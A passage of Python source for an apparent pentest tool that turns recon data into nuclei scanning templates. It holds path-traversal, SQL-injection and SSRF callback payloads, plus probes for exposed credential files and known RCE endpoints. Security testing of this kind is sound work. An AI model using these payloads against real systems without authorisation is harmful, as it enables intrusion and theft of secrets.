#!/usr/bin/env python3
"""
ARISE — Recon-Driven Attack Synthesizer  (Layer 4: the recon→attack pivot)
==========================================================================
The pipeline already CLASSIFIES the whole surface: 08_directory_discovery/
attack_routing.jsonl tags every URL with an attack lane (sqli, bola, ssti-lfi,
ssrf, version-swap, graphql, dangerous-methods, ...). But a label is not an
attack. This module turns those labels — plus the tech fingerprint and the
live HTTP facts recon already collected — into TARGETED nuclei templates that
each encode a bug-bounty-hunter hypothesis with a confirmation matcher.

  inference  →  "url_class=api, url_shape=path-param  (a BOLA candidate)"
  evidence   →  a template that swaps the object id and matches 200 + a JSON
                object body, so the finding is CONFIRMED, not guessed.

What it emits (per scan, under 08d_attack_synth/):
  generated-templates/<host>/exposure.yaml       — confirm discovered sensitive paths by signature
  generated-templates/<host>/version-swap.yaml   — reach undocumented /v2 /internal /admin API versions
  generated-templates/<host>/methods.yaml        — OPTIONS-read the allowed verbs (state-changing surface)
  generated-templates/<host>/idor.yaml           — object-id mutation on path-param API endpoints
  generated-templates/<host>/graphql.yaml         — introspection probe on graphql endpoints
  generated-templates/fuzz/xss-reflect.yaml       — DAST reflection fuzz, scoped to the xss lane's params
  generated-templates/fuzz/sqli-error.yaml        — DAST error-based fuzz, prioritises the 90k sqli lane
  generated-templates/fuzz/lfi-traversal.yaml     — DAST path-traversal fuzz, scoped to ssti-lfi params
  generated-templates/fuzz/ssrf-oob.yaml          — DAST OOB fuzz (interactsh) scoped to ssrf params
  targets/<lane>_urls.txt                          — recon-scoped URL lists to feed nuclei -dast / -l
  tech_tags.txt                                    — detected nuclei tags → run community CVEs, not all of them
  synth_manifest.json                              — every hypothesis + counts (the audit trail)
  run_attacks.sh                                   — the exact nuclei commands to launch the synthesized attack

SAFETY. This tool is read-only over scan data and WRITES templates; it never
launches them. Every default is confirm-not-exploit: GET/OPTIONS only, no
state mutation, OOB uses a callback oracle (nothing internal is read). The
generated run_attacks.sh is for the operator to run against AUTHORISED targets.
State-changing method probes (PUT/DELETE) are emitted OFF unless --allow-mutation.

Usage:
    python3 recon_attack_synth.py <scan_dir> [--out DIR] [--max-hosts N]
        [--per-host-cap N] [--no-fuzz] [--allow-mutation] [--summary]
"""
from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)


import argparse
import json
import os
import re
import sys
from collections import defaultdict, Counter
from datetime import datetime, timezone
from urllib.parse import urlsplit

SYNTH_VERSION = "1.0"

# ---------------------------------------------------------------------------
# Hacker knowledge — the hypotheses, as data
# ---------------------------------------------------------------------------

# Discovered path → the signature that CONFIRMS the exposure (evidence, not a 200).
EXPOSURE_SIGNATURES = [
    (re.compile(r"/\.git/config$", re.I),        ["[core]", "repositoryformatversion"], "critical", "Exposed .git repository"),
    (re.compile(r"/\.git/HEAD$", re.I),           ["ref: refs/"],                        "critical", "Exposed .git repository"),
    (re.compile(r"/\.env$", re.I),                ["APP_", "DB_", "SECRET", "_KEY="],    "critical", "Exposed .env secrets file"),
    (re.compile(r"/\.aws/credentials$", re.I),    ["aws_access_key_id"],                 "critical", "Exposed AWS credentials"),
    (re.compile(r"/actuator(/|$)", re.I),         ["\"status\"", "_links", "\"health\""],"high",     "Spring Boot actuator exposed"),
    (re.compile(r"/actuator/env$", re.I),         ["\"propertySources\""],               "critical", "Spring actuator /env — config & secrets"),
    (re.compile(r"/actuator/heapdump$", re.I),    [],                                     "critical", "Spring actuator heapdump downloadable"),
    (re.compile(r"/(server-status|server-info)$", re.I), ["Apache Server Status"],        "high",     "Apache mod_status exposed"),
    (re.compile(r"/phpinfo\.php$", re.I),         ["PHP Version", "phpinfo()"],          "high",     "phpinfo() exposed"),
    (re.compile(r"/wp-config\.php\.(bak|old|save|swp|txt)$", re.I), ["DB_PASSWORD"],      "critical", "WordPress config backup exposed"),
    (re.compile(r"/\.DS_Store$", re.I),           ["Bud1"],                              "low",      "Directory listing via .DS_Store"),
    (re.compile(r"/(config|settings|secrets)\.(json|ya?ml)$", re.I), ["password", "secret", "token", "key"], "high", "Config file with credentials exposed"),
    (re.compile(r"/swagger(-ui)?(\.html|/|$)", re.I), ["swagger", "openapi", "\"paths\""],"info",    "API schema exposed (map the whole API)"),
    (re.compile(r"/(openapi|api-docs|v[0-9]+/api-docs)(\.json|/|$)", re.I), ["\"openapi\"", "\"swagger\""], "info", "OpenAPI spec exposed (map the whole API)"),
    (re.compile(r"/graphql", re.I),               ["__schema", "\"data\""],              "info",     "GraphQL endpoint (introspection candidate)"),
    (re.compile(r"/(debug|_debug|trace|_profiler)(/|$)", re.I), ["Whoops", "stack trace", "DEBUG"], "high", "Debug/trace endpoint exposed"),
    (re.compile(r"/(backup|dump|db)\.(sql|zip|tar\.gz|gz|bak)$", re.I), [],               "critical", "Database/backup archive downloadable"),
]

# Extra sensitive paths worth CONFIRMING on every API/web host even if recon
# didn't crawl them (a hunter always checks these by hand).
EXPOSURE_PROBE_PATHS = [
    "/.git/config", "/.env", "/actuator", "/actuator/env", "/actuator/heapdump",
    "/swagger-ui.html", "/openapi.json", "/api-docs", "/v2/api-docs", "/graphql",
    "/.aws/credentials", "/server-status", "/phpinfo.php", "/debug",
]

# Undocumented API versions/namespaces a hunter pivots to after seeing /v1.
VERSION_SWAP_VARIANTS = ["v2", "v3", "v0", "internal", "admin", "private",
                         "beta", "test", "staging", "dev", "legacy"]

# LFI payloads + the signatures that prove file read.
LFI_PAYLOADS = ["../../../../../../etc/passwd", "....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd",
                "../../../../../../windows/win.ini"]
LFI_SIGNATURES = ["root:.*:0:0:", "\\[extensions\\]", "\\[fonts\\]"]

# Findings-informed second wave: when a first-pass finding (or a host's tech
# fingerprint) reveals a technology, a hunter checks THESE known-sensitive
# follow-on paths. key = regex matched against the finding blob (tags + name +
# template-id) and the host's detected tech; value = [(path, [confirm-sigs],
# severity, desc)]. This is what turns "we found Spring" into "pull its heapdump".
TECH_FOLLOWON = {
    r"spring|actuator|springboot": [
        ("/actuator/env", ["propertySources"], "critical", "Spring env — config & secrets"),
        ("/actuator/heapdump", [], "critical", "Heap dump downloadable"),
        ("/actuator/configprops", ["contexts", "beans"], "high", "Config properties"),
        ("/actuator/mappings", ["handler", "predicate"], "medium", "All routes disclosed"),
        ("/actuator/threaddump", ["threads"], "medium", "Thread dump"),
    ],
    r"jenkins": [
        ("/script", ["Groovy", "System.getenv"], "critical", "Jenkins script console (RCE)"),
        ("/api/json?tree=jobs[name]", ["jobs"], "medium", "Job enumeration via API"),
        ("/asynchPeople/", ["people"], "low", "User enumeration"),
    ],
    r"wordpress|wp-content|wp-json": [
        ("/wp-json/wp/v2/users", ["\"slug\""], "medium", "WP user enumeration (REST)"),
        ("/wp-content/debug.log", ["PHP"], "high", "WP debug log"),
        ("/wp-config.php.bak", ["DB_PASSWORD"], "critical", "WP config backup"),
        ("/xmlrpc.php", ["XML-RPC"], "low", "xmlrpc enabled (amplification/SSRF)"),
    ],
    r"laravel": [
        ("/telescope/requests", ["Telescope"], "high", "Laravel Telescope exposed"),
        ("/_ignition/execute-solution", ["solution"], "critical", "Ignition RCE endpoint"),
        ("/storage/logs/laravel.log", ["production.ERROR", "stack trace"], "high", "Laravel log"),
    ],
    r"phpinfo|\bphp\b": [
        ("/phpinfo.php", ["phpinfo()"], "high", "phpinfo() disclosure"),
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", [], "critical", "PHPUnit eval-stdin RCE"),
    ],
    r"gitlab": [
        ("/explore/projects", ["project"], "medium", "Public project exposure"),
        ("/api/v4/projects", ["\"id\""], "medium", "GitLab API project list"),
    ],
    r"grafana": [
        ("/public/plugins/mysql/", [], "high", "Grafana plugin LFI (CVE-2021-43798)"),
        ("/api/health", ["\"database\""], "low", "Grafana health"),
    ],
    r"kibana|elasticsearch": [
        ("/_cat/indices", ["health", "yellow", "green"], "high", "Elasticsearch indices exposed"),
        ("/api/status", ["\"status\""], "medium", "Kibana status"),
    ],
    r"tomcat|coyote": [
        ("/manager/html", ["Tomcat Web Application Manager"], "high", "Tomcat manager"),
        ("/host-manager/html", ["Host Manager"], "high", "Tomcat host-manager"),
    ],
    r"graphql|apollo|graphiql": [
        ("/graphiql", ["graphiql", "GraphiQL"], "low", "GraphiQL IDE exposed"),
    ],
    r"swagger|openapi|api-docs": [
        ("/v3/api-docs", ["\"openapi\""], "info", "OpenAPI v3 spec (maps the API)"),
        ("/swagger-resources", ["\"location\""], "info", "Swagger resources"),
    ],
}

# ---------------------------------------------------------------------------
# Loaders — every source is optional; a missing file just yields fewer attacks
# ---------------------------------------------------------------------------

def _iter_jsonl(path):
    try:
        with open(path, errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    yield json.loads(line)
                except Exception:
                    continue
    except OSError:
        return


def _first_existing(scan_dir, *rels):
    for rel in rels:
        p = os.path.join(scan_dir, rel)
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    return None


def _host_only(u):
    """Strip scheme/path/port from a finding's host/url field."""
    u = (u or "").strip().lower()
    if "://" in u:
        try:
            return urlsplit(u).hostname or ""
        except Exception:
            return ""
    return u.split("/")[0].split(":")[0]


def load_attack_routing(scan_dir):
    p = _first_existing(scan_dir,
                        "08_directory_discovery/attack_routing.jsonl",
                        "8B_endpoint_consolidation/attack_routing.jsonl",
                        "8B/attack_routing.jsonl")
    return list(_iter_jsonl(p)) if p else []


def load_tech(scan_dir):
    """host -> {'techs': set, 'nuclei_tags': set}"""
    out = defaultdict(lambda: {"techs": set(), "nuclei_tags": set()})
    p = _first_existing(scan_dir, "04_http_discovery/tech_manifest.jsonl")
    for r in (_iter_jsonl(p) if p else []):
        h = (r.get("host") or "").lower()
        if not h:
            continue
        out[h]["techs"].update(r.get("techs") or [])
        out[h]["nuclei_tags"].update(r.get("nuclei_tags") or [])
    # http_confirmed carries tech arrays too (JSONL despite the .json name)
    p2 = _first_existing(scan_dir, "04_http_discovery/http_confirmed.json")
    for r in (_iter_jsonl(p2) if p2 else []):
        h = (r.get("host") or "").lower()
        if h and r.get("tech"):
            out[h]["techs"].update(r["tech"])
    return out


def load_status_map(scan_dir):
    """url -> status_code, from http_confirmed (helps prioritise)."""
    out = {}
    p = _first_existing(scan_dir, "04_http_discovery/http_confirmed.json")
    for r in (_iter_jsonl(p) if p else []):
        u = r.get("url")
        if u:
            out[u] = r.get("status_code")
    return out


# ---------------------------------------------------------------------------
# Endpoint model
# ---------------------------------------------------------------------------

class Endpoint:
    __slots__ = ("url", "host", "attack", "url_class", "api_type", "url_shape",
                 "methods", "status", "path")

    def __init__(self, r):
        self.url = r.get("url") or r.get("template") or ""
        self.host = (r.get("host") or "").lower()
        a = r.get("attack")
        self.attack = a if isinstance(a, str) else (a[0] if isinstance(a, list) and a else "")
        self.url_class = r.get("url_class") or "unknown"
        self.api_type = r.get("api_type")
        self.url_shape = r.get("url_shape") or "plain"
        m = r.get("methods") or ["GET"]
        self.methods = m if isinstance(m, list) else [m]
        self.status = r.get("status")
        try:
            self.path = urlsplit(self.url).path or "/"
        except Exception:
            self.path = "/"


# Status worth attacking, most-interesting first (a hunter ignores clean 404s).
STATUS_PRIORITY = {200: 0, 401: 1, 403: 1, 500: 2, 405: 2, 301: 3, 302: 3}


def _priority(ep):
    return STATUS_PRIORITY.get(ep.status, 4)


# ---------------------------------------------------------------------------
# YAML emit (hand-rolled — no PyYAML dependency; output is validated on write)
# ---------------------------------------------------------------------------

def _y(s):
    """Quote a scalar safely for our template shapes."""
    s = str(s)
    if s == "" or re.search(r'[:#\[\]{}",&*?|<>=!%@`\\]', s) or s != s.strip():
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
    return s


def _info_block(name, severity, tags, desc):
    return (
        "info:\n"
        f"  name: {_y(name)}\n"
        "  author: arise-synth\n"
        f"  severity: {severity}\n"
        f"  description: {_y(desc)}\n"
        "  tags: " + ",".join(["arise", "synth"] + tags) + "\n"
    )


# ---------- per-host: exposure confirmation ----------

def tmpl_exposure(host, paths_with_sig):
    lines = [f"id: arise-synth-exposure-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"Sensitive path exposure — {host}", "high",
                         ["exposure", "config"],
                         "Confirms discovered sensitive paths by response signature, not just a 200.")]
    lines.append("http:")
    lines.append("  - method: GET")
    lines.append("    path:")
    for path, _sig in paths_with_sig:
        lines.append(f"      - {_y('{{BaseURL}}' + path)}")
    lines.append("    stop-at-first-match: false")
    lines.append("    matchers-condition: and")
    lines.append("    matchers:")
    lines.append("      - type: status")
    lines.append("        status: [200]")
    # union of all signatures; OR so any confirming string flags
    sigs = sorted({s for _p, sig in paths_with_sig for s in sig})
    if sigs:
        lines.append("      - type: word")
        lines.append("        part: body")
        lines.append("        condition: or")
        lines.append("        words:")
        for s in sigs:
            lines.append(f"          - {_y(s)}")
    return "\n".join(lines) + "\n"


# ---------- per-host: findings-informed tech follow-on ----------

_SEV_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


def tmpl_followon(host, entries):
    """entries: [(path, [sigs], severity, desc)] — the deep paths a hunter
    checks once first-pass findings reveal the host's technology."""
    sev = max((e[2] for e in entries), key=lambda s: _SEV_ORDER.get(s, 0)) if entries else "info"
    lines = [f"id: arise-synth-followon-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"Tech follow-on exposure — {host}", sev,
                         ["followon", "exposure", "findings-informed"],
                         "First-pass findings/tech revealed a technology; these are its known-sensitive follow-on paths, confirmed by signature.")]
    lines.append("http:")
    lines.append("  - method: GET")
    lines.append("    path:")
    for path, _sig, _sv, _desc in entries:
        lines.append(f"      - {_y('{{BaseURL}}' + path)}")
    lines.append("    stop-at-first-match: false")
    lines.append("    matchers-condition: and")
    lines.append("    matchers:")
    lines.append("      - type: status")
    lines.append("        status: [200]")
    sigs = sorted({s for _p, sg, _sv, _d in entries for s in sg})
    if sigs:
        lines.append("      - type: word")
        lines.append("        part: body")
        lines.append("        condition: or")
        lines.append("        words:")
        for s in sigs:
            lines.append(f"          - {_y(s)}")
    return "\n".join(lines) + "\n"


# ---------- per-host: API version swap ----------

def tmpl_version_swap(host, versioned_paths):
    lines = [f"id: arise-synth-versionswap-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"Undocumented API version reachable — {host}", "medium",
                         ["api", "version-swap", "authz"],
                         "Swaps the API version segment to reach undocumented namespaces (/v2,/internal,/admin).")]
    swapped = []
    for p in versioned_paths:
        for var in VERSION_SWAP_VARIANTS:
            np = re.sub(r"/v[0-9]+(/|$)", f"/{var}\\1", p, count=1)
            if np != p:
                swapped.append(np)
    swapped = sorted(set(swapped))[:80]
    if not swapped:
        return None
    lines.append("http:")
    lines.append("  - method: GET")
    lines.append("    path:")
    for p in swapped:
        lines.append(f"      - {_y('{{BaseURL}}' + p)}")
    lines.append("    stop-at-first-match: false")
    lines.append("    matchers:")
    lines.append("      - type: status")
    lines.append("        status: [200, 201, 401, 403]   # reachable but undocumented")
    return "\n".join(lines) + "\n"


# ---------- per-host: allowed-methods discovery ----------

def tmpl_methods(host, paths, allow_mutation):
    lines = [f"id: arise-synth-methods-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"State-changing method surface — {host}", "info",
                         ["api", "misconfig", "http-methods"],
                         "OPTIONS-reads the advertised verbs; flags write methods (PUT/DELETE/PATCH) on API endpoints.")]
    lines.append("http:")
    lines.append("  - method: OPTIONS")
    lines.append("    path:")
    for p in paths[:60]:
        lines.append(f"      - {_y('{{BaseURL}}' + p)}")
    lines.append("    matchers-condition: and")
    lines.append("    matchers:")
    lines.append("      - type: word")
    lines.append("        part: header")
    lines.append("        condition: or")
    lines.append("        words:")
    for verb in (["PUT", "DELETE", "PATCH"] if not allow_mutation else ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]):
        lines.append(f"          - {_y('Allow: ' + verb)}")
        lines.append(f"          - {_y(verb)}")
    lines.append("    extractors:")
    lines.append("      - type: kval")
    lines.append("        part: header")
    lines.append("        kval: [Allow, Access-Control-Allow-Methods]")
    return "\n".join(lines) + "\n"


# ---------- per-host: IDOR / BOLA object-id mutation ----------
# A hunter only IDOR-tests a REAL object reference: /<resource-noun>/<id>.
# Not CDN/WAF challenge tokens, not static assets, not pagination counters —
# testing those is the noise that makes a scanner look dumb.

INFRA_SKIP = re.compile(
    r"/(cdn-cgi|challenge-platform|__cf|akam|wp-content|wp-includes|_next|"
    r"static|assets?|dist|build|fonts?|images?|img|media|css|js|vendor|"
    r"node_modules|sitemap|robots)\b", re.I)
_RESOURCE_NOUN = re.compile(r"^[A-Za-z][A-Za-z_-]{1,40}$")
_PAGINATION = {"page", "pages", "p", "offset", "limit", "size", "index",
               "chunk", "per_page", "start", "count", "n", "step", "level"}
_NUM_ID = re.compile(r"^\d{1,12}$")
_UUID_ID = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
_OID_ID = re.compile(r"^[0-9a-f]{24}$", re.I)


def _is_object_id(seg):
    return bool(_NUM_ID.match(seg) or _UUID_ID.match(seg) or _OID_ID.match(seg))


def idor_mutations(path):
    """Return mutated paths iff `path` looks like /<noun>/<id>. Else []."""
    if INFRA_SKIP.search(path):
        return []
    segs = path.split("/")
    out = []
    prev_noun = None  # nearest preceding non-empty segment
    for i, s in enumerate(segs):
        if s == "":
            continue
        if _is_object_id(s) and prev_noun and prev_noun.lower() not in _PAGINATION \
                and _RESOURCE_NOUN.match(prev_noun):
            if _NUM_ID.match(s):
                n = int(s)
                vals = {str(v) for v in (n - 1, n + 1, 0, 1, 99999999) if v >= 0}
            else:
                vals = {"1", "0", "00000000-0000-0000-0000-000000000000"}
            vals.discard(s)
            for v in sorted(vals)[:4]:
                out.append("/".join(segs[:i] + [v] + segs[i + 1:]))
            break  # one id per path is enough
        prev_noun = s
    return out


def tmpl_idor(host, idor_paths):
    """idor_paths: list of path strings that passed idor_mutations()."""
    variants = []
    for p in idor_paths:
        variants.extend(idor_mutations(p))
    variants = sorted(set(variants))[:100]
    if not variants:
        return None
    lines = [f"id: arise-synth-idor-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"Broken object-level authz (IDOR/BOLA) — {host}", "high",
                         ["api", "bola", "idor", "authz"],
                         "Requests object endpoints with mutated ids; a 200 with an object body on an unauthenticated request indicates missing object-level authorization. Verify with two identities.")]
    lines.append("http:")
    lines.append("  - method: GET")
    lines.append("    path:")
    for p in variants:
        lines.append(f"      - {_y('{{BaseURL}}' + p)}")
    lines.append("    stop-at-first-match: false")
    lines.append("    matchers-condition: and")
    lines.append("    matchers:")
    lines.append("      - type: status")
    lines.append("        status: [200]")
    lines.append("      - type: word")
    lines.append("        part: header")
    lines.append("        words: ['application/json']")
    lines.append("      - type: word")
    lines.append("        part: body")
    lines.append("        condition: or")
    lines.append("        words: ['\"id\"', '\"email\"', '\"user', '\"name\"', '\"amount\"', '\"account']")
    return "\n".join(lines) + "\n"


# ---------- per-host: GraphQL introspection ----------

def tmpl_graphql(host, gql_paths):
    if not gql_paths:
        return None
    lines = [f"id: arise-synth-graphql-{re.sub(r'[^a-z0-9]+','-',host)}",
             _info_block(f"GraphQL introspection enabled — {host}", "medium",
                         ["graphql", "introspection", "exposure"],
                         "Sends a minimal introspection query; a __schema response means the entire API graph is enumerable.")]
    lines.append("http:")
    lines.append("  - raw:")
    for p in sorted(set(gql_paths))[:10]:
        body = '{"query":"{__schema{queryType{name}}}"}'
        raw = ("      - |\n"
               f"        POST {p} HTTP/1.1\n"
               "        Host: {{Hostname}}\n"
               "        Content-Type: application/json\n"
               "\n"
               f"        {body}\n")
        lines.append(raw.rstrip("\n"))
    lines.append("    matchers-condition: and")
    lines.append("    matchers:")
    lines.append("      - type: word")
    lines.append("        part: body")
    lines.append("        words: ['__schema', 'queryType']")
    lines.append("        condition: and")
    lines.append("      - type: status")
    lines.append("        status: [200]")
    return "\n".join(lines) + "\n"


# ---------- DAST fuzzing templates (recon-scoped via the -l target list) ----------

def fuzz_xss():
    return """id: arise-synth-fuzz-xss-reflect
info:
  name: Reflected XSS — recon-scoped DAST
  author: arise-synth
  severity: medium
  description: Injects a unique marker into each query parameter and flags unencoded reflection.
  tags: arise,synth,dast,xss,fuzz
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
    payloads:
      marker:
        - "aris0x27{{rand_base(6)}}0x3e"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{marker}}"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{marker}}"
      - type: word
        part: header
        words:
          - "text/html"
"""


def fuzz_sqli():
    return """id: arise-synth-fuzz-sqli-error
info:
  name: Error-based SQLi — recon-scoped DAST (triage before sqlmap)
  author: arise-synth
  severity: high
  description: Appends SQL breakers to each parameter and matches DB error signatures. A fast triage pass so sqlmap only chases the params that already leak an error.
  tags: arise,synth,dast,sqli,fuzz
http:
  - payloads:
      breaker:
        - "'"
        - "\\""
        - "') OR ('1'='1"
        - "' AND 1=CONVERT(int,@@version)-- -"
    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{breaker}}"
    matchers:
      - type: regex
        part: body
        condition: or
        regex:
          - "SQL syntax.*MySQL"
          - "Warning.*mysqli?"
          - "PostgreSQL.*ERROR"
          - "ORA-[0-9]{5}"
          - "Microsoft OLE DB Provider for SQL Server"
          - "SQLite/JDBCDriver"
          - "Unclosed quotation mark after the character string"
"""


def fuzz_lfi():
    payloads = "\n".join(f"        - {json.dumps(p)}" for p in LFI_PAYLOADS)
    regex = "\n".join(f"          - {json.dumps(s)}" for s in LFI_SIGNATURES)
    return f"""id: arise-synth-fuzz-lfi-traversal
info:
  name: Path traversal / LFI — recon-scoped DAST
  author: arise-synth
  severity: high
  description: Replaces file-like parameters with traversal payloads and matches /etc/passwd and win.ini signatures.
  tags: arise,synth,dast,lfi,fuzz
http:
  - payloads:
      trav:
{payloads}
    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{{{trav}}}}"
    matchers:
      - type: regex
        part: body
        condition: or
        regex:
{regex}
"""


def fuzz_ssrf():
    return """id: arise-synth-fuzz-ssrf-oob
info:
  name: SSRF (blind, OOB) — recon-scoped DAST
  author: arise-synth
  severity: high
  description: Replaces url-like parameters with an interactsh callback and confirms via out-of-band interaction. Nothing internal is read — the server merely pings our oracle.
  tags: arise,synth,dast,ssrf,fuzz,oob
http:
  - payloads:
      oob:
        - "https://{{interactsh-url}}"
        - "http://{{interactsh-url}}"
    fuzzing:
      - part: query
        type: replace
        mode: single
        keys:
          - url
          - uri
          - u
          - link
          - src
          - dest
          - redirect
          - next
          - callback
          - webhook
          - target
          - image
          - imageurl
          - file
          - path
          - domain
          - host
        fuzz:
          - "{{oob}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
"""


# ---------------------------------------------------------------------------
# Synthesis
# ---------------------------------------------------------------------------

def synthesize(scan_dir, out_dir, max_hosts, per_host_cap, emit_fuzz, allow_mutation):
    routing = load_attack_routing(scan_dir)
    tech = load_tech(scan_dir)
    status_map = load_status_map(scan_dir)

    if not routing:
        return None, "no attack_routing.jsonl found — run recon (module 8B/endpoint_consolidation) first"

    # Findings-informed second wave: read what the pipeline already CONFIRMED, so
    # synthesis targets the exact tech + hosts that produced hits (a hunter's 2nd
    # pass). Empty on a recon-only run — degrades to pure recon-driven synthesis.
    findings = load_findings(scan_dir)
    finding_hosts = set()           # hosts that already produced a finding (hot)
    host_signal = defaultdict(str)  # host -> lowercase blob of its findings
    for f in findings:
        info = f.get("info", {}) if isinstance(f.get("info"), dict) else {}
        tags = info.get("tags") or f.get("tags") or []
        if isinstance(tags, str):
            tags = tags.split(",")
        blob = " ".join([str(f.get("template-id") or f.get("templateID") or ""),
                         str(info.get("name") or f.get("name") or ""),
                         " ".join(str(t) for t in tags)]).lower()
        h = _host_only(f.get("host") or f.get("matched-at") or f.get("url") or "")
        if h:
            finding_hosts.add(h)
            host_signal[h] += " " + blob

    # Bucket endpoints per host per lane, deduped by path, prioritised by status.
    per_host = defaultdict(lambda: defaultdict(dict))  # host -> lane -> {path: Endpoint}
    lane_urls = defaultdict(set)                        # lane -> set(url) for DAST feeds
    host_all_paths = defaultdict(set)
    versioned = defaultdict(set)
    idor_cands = defaultdict(set)
    gql_paths = defaultdict(set)
    exposure_hits = defaultdict(list)                  # host -> [(path, signatures)]
    lane_counter = Counter()                           # attack lane -> count (for AI summary)
    lane_samples = defaultdict(list)                   # attack lane -> sample urls

    seen = 0
    for raw in routing:
        ep = Endpoint(raw)
        if not ep.host or not ep.url:
            continue
        seen += 1
        if ep.status is None:
            ep.status = status_map.get(ep.url)
        host_all_paths[ep.host].add(ep.path)
        per_host[ep.host][ep.attack][ep.path] = ep
        if ep.attack:
            lane_counter[ep.attack] += 1
            if len(lane_samples[ep.attack]) < 8:
                lane_samples[ep.attack].append(ep.url)

        # DAST lane feeds (only param'd URLs are worth fuzzing)
        if ep.url_shape in ("query-param",) and ep.attack in ("xss", "sqli", "ssti-lfi", "ssrf"):
            lane_urls[ep.attack].add(ep.url)

        # version-swap candidates
        if re.search(r"/v[0-9]+(/|$)", ep.path):
            versioned[ep.host].add(ep.path)
        # idor candidates: api path-param that is a real /<noun>/<id> reference
        if ep.url_class == "api" and ep.url_shape == "path-param":
            if idor_mutations(ep.path):
                idor_cands[ep.host].add(ep.path)
        # graphql
        if ep.attack == "graphql" or ep.api_type == "graphql" or "/graphql" in ep.path.lower():
            gql_paths[ep.host].add(ep.path)
        # exposure — discovered path matches a known sensitive signature
        for rx, sig, sev, desc in EXPOSURE_SIGNATURES:
            if rx.search(ep.path):
                exposure_hits[ep.host].append((ep.path, sig))
                break

    # Rank hosts: those that already produced FINDINGS are "hot" and synthesized
    # first (a hunter deepens where they already got a hit), then by surface size.
    host_rank = sorted(host_all_paths,
                       key=lambda h: (h not in finding_hosts, -len(host_all_paths[h])))
    if max_hosts:
        host_rank = host_rank[:max_hosts]

    # ---- write everything ----
    gen = os.path.join(out_dir, "generated-templates")
    tgt = os.path.join(out_dir, "targets")
    os.makedirs(gen, exist_ok=True)
    os.makedirs(tgt, exist_ok=True)

    manifest = {
        "synth_version": SYNTH_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "scan_dir": os.path.abspath(scan_dir),
        "endpoints_seen": seen,
        "hosts_considered": len(host_rank),
        "templates": [],
        "targets": {},
        "tech_tags": sorted({t for h in host_rank for t in tech.get(h, {}).get("nuclei_tags", set())}),
    }
    tmpl_count = Counter()

    def _write(relpath, content):
        full = os.path.join(gen, relpath)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w") as fh:
            fh.write(content)
        manifest["templates"].append({"file": os.path.relpath(full, out_dir),
                                       "lane": relpath.split("/")[-1].replace(".yaml", "")})

    for host in host_rank:
        # Use the host verbatim as the dir name — run_attacks.sh targets
        # `https://<dir>`, so rewriting '-'→'_' would corrupt the hostname.
        # Hosts are already filesystem-safe; only sanitise genuinely odd chars.
        hslug = host if re.fullmatch(r"[a-z0-9._-]+", host) else re.sub(r"[^a-z0-9._-]+", "_", host)
        # exposure: discovered sensitive paths + the curated always-check set
        exp = {p: sig for p, sig in exposure_hits.get(host, [])}
        for pp in EXPOSURE_PROBE_PATHS:
            exp.setdefault(pp, next((s for rx, s, _sv, _d in EXPOSURE_SIGNATURES if rx.search(pp)), []))
        if exp:
            _write(f"{hslug}/exposure.yaml", tmpl_exposure(host, list(exp.items())[:per_host_cap]))
            tmpl_count["exposure"] += 1
        # findings-informed follow-on: match tech signals (this host's own
        # findings + its detected tech) to the known deep paths for that tech.
        htech = " ".join(tech.get(host, {}).get("techs", set())).lower()
        sig = (host_signal.get(host, "") + " " + htech).strip()
        if sig:
            fo, seen_p = [], set()
            for pat, entries in TECH_FOLLOWON.items():
                if re.search(pat, sig):
                    for e in entries:
                        if e[0] not in seen_p:
                            seen_p.add(e[0]); fo.append(e)
            if fo:
                _write(f"{hslug}/followon.yaml", tmpl_followon(host, fo[:per_host_cap]))
                tmpl_count["followon"] += 1
        # version swap
        if versioned.get(host):
            t = tmpl_version_swap(host, sorted(versioned[host])[:per_host_cap])
            if t:
                _write(f"{hslug}/version-swap.yaml", t)
                tmpl_count["version-swap"] += 1
        # methods
        api_paths = sorted({p for lane in ("api-blackbox", "dangerous-methods", "bola")
                            for p in per_host[host].get(lane, {})})
        if api_paths:
            _write(f"{hslug}/methods.yaml", tmpl_methods(host, api_paths, allow_mutation))
            tmpl_count["methods"] += 1
        # idor
        if idor_cands.get(host):
            t = tmpl_idor(host, sorted(idor_cands[host])[:per_host_cap])
            if t:
                _write(f"{hslug}/idor.yaml", t)
                tmpl_count["idor"] += 1
        # graphql
        if gql_paths.get(host):
            t = tmpl_graphql(host, sorted(gql_paths[host]))
            if t:
                _write(f"{hslug}/graphql.yaml", t)
                tmpl_count["graphql"] += 1

    # DAST fuzzing templates + their scoped target lists
    if emit_fuzz:
        fuzz_map = {"xss": fuzz_xss(), "sqli": fuzz_sqli(),
                    "ssti-lfi": fuzz_lfi(), "ssrf": fuzz_ssrf()}
        fname = {"xss": "xss-reflect", "sqli": "sqli-error",
                 "ssti-lfi": "lfi-traversal", "ssrf": "ssrf-oob"}
        for lane, content in fuzz_map.items():
            urls = sorted(lane_urls.get(lane, set()))
            if not urls:
                continue
            _write(f"fuzz/{fname[lane]}.yaml", content)
